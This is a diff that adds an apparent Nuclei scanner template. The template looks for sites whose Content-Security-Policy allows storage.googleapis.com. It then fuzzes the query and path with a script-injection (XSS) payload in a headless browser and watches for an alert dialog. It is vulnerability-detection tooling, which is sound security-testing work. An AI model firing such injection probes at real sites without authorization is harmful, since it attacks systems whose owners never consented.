@@ -1,0 +1,67 @@
+id: google-storage-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Google Storage
+  author: 0x_Akoko
+  severity: medium
+  description: |
+    CSP policy allows Google Storage (storage.googleapis.com) enabling malicious JavaScript execution by loading attacker-controlled files from whitelisted domain.
+  reference:
+    - https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy
+    - https://huntr.com/bounties/6cea89d1-39dc-4023-82fa-821f566b841a
+  metadata:
+    verified: true
+    max-request: 2
+  classification:
+    cwe-id: CWE-79
+  tags: xss,csp-bypass,google-storage,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "storage.googleapis.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: google_storage_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - "<script>alert(document.domain)</script>"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+      - part: path
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "google_storage_csp_xss == true"
+# digest: 490a00463044021f428bef4f94cbadd2d77a3c70e4546b48614d439ba6e919cfb805fc6198b025022100e8b1f79129ce7d5385fa5c255f133de86982b698d5c085eb4e3d602bc59388a4:922c64590222798bb761d5b6d8e72950
